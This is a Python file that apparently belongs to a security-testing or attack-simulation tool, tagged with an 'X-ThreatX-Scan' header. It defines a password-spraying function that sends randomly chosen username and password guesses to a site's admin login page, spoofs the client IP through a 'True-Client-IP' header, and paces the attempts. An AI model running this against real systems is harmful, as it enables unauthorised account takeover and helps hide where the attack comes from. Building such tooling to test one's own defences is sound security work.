import random
import requests
from time import sleep

# send passwords a list to /?your-admin-logon-page
def password_spraying(target, source_ip, user_agent, **kwargs):

    #usernames and passwords to try
    cred_list = [
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4n0' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4na' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nb' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nc' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nd' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4ne' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nf' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4ng' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nh' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4ni' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nj' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nk' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nl' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nm' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nn' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4no' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4np' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nq' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nr' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4ns' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nt' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nu' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nv' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nw' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nx' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4ny' },
                    { 'username': 'site-admin-sdkmdn3@yahoo.com', 'password': 'zxcvb4nz' }
                ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded',
               'X-ThreatX-Scan': 'password_spraying'
              }

    count=random.randint(10,15)

    for i in range(count):

        cred = random.choice(cred_list)

        attack = {
                  "method": "POST",
                  "url": "{}/?your-admin-logon-page".format(target),
                  "payload": {"log": cred['username'], "pwd": cred['password']}
                  }
        response = requests.request(attack['method'], attack['url'], headers=headers, data=attack['payload']).status_code

        sleep(5)

    return("password_stuffing: sent {} passwords to {}/?target=your-admin-logon-page".format(count,target))
